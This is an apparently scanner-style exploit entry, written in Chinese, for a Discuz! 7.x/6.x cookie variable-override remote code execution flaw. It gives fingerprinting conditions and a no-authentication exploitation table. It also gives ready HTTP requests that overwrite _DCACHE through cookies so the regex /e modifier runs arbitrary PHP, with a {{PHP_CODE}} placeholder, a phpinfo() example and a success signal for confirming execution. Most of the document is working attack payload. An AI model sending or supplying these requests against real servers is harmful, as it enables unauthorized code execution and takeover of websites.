# Discuz 7.x/6.x Variable Override RCE (wooyun-2010-080723)

## 指纹特征
- 服务: Discuz! 7.x, 6.x
- 端口: 80 (HTTP)
- 依赖: PHP 5.3.x (且 `request_order` 不包含 'C')

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| Cookie 变量覆盖 | `/viewthread.php` | 无 |

## PoC 指令

通过 Cookie 注入 `$GLOBALS` 变量，覆盖 `_DCACHE` 以触发 `/e` 修正符下的正则替换执行代码：

```http
GET /viewthread.php?tid={{TID}} HTTP/1.1
Host: {{TARGET}}
Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]={{PHP_CODE}};
```

**示例 (执行 phpinfo)**:
```http
GET /viewthread.php?tid=1 HTTP/1.1
Host: {{TARGET}}
Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
```

## Success Signal
- **响应内容**: 响应 Body 中包含 PHP 配置信息字符串（如 `PHP Version`）或指定的执行结果。
